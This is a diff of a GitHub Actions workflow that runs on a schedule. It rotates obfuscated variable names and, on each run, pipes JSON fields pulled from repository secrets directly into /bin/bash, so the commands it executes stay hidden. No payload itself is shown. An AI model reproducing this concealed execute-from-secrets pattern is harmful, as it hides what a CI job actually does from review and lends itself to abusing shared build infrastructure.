@@ -1,24 +1,25 @@
 name: xiongyonghong6473
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 2/6 * * *'
+    - cron: '31 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiongyonghong6473
         env:
-          ko84: ${{ secrets.ko84 }}
+          x7007: ${{ secrets.x7007 }}
         run: |
-          echo $ko84 | jq -r .s2 | /bin/bash
-          echo $ttxsk90969 | jq -r .pzqls0284 | /bin/bash
-          echo $zf04164 | jq -r .nfrdc23 | /bin/bash
-          echo $fdkor12 | jq -r .h68 | /bin/bash
-          echo $yrelw3 | jq -r .cx300 | /bin/bash
-          echo $jkam072 | jq -r .gwmo79 | /bin/bash
-          echo $wqt78 | jq -r .hfz81 | /bin/bash
-          echo $k74 | jq -r .dbrp176 | /bin/bash
+          echo $x7007 | jq -r .gsiy0 | /bin/bash
+          echo $vlevj16 | jq -r .jcdr639 | /bin/bash
+          echo $veev38 | jq -r .yotrz9420 | /bin/bash
+          echo $astd93999 | jq -r .p803 | /bin/bash
+          echo $c43476 | jq -r .frk03 | /bin/bash
+          echo $yh35793 | jq -r .b3899 | /bin/bash
+          echo $leht3431 | jq -r .dj62 | /bin/bash
+          echo $k1 | jq -r .akkn7 | /bin/bash
 
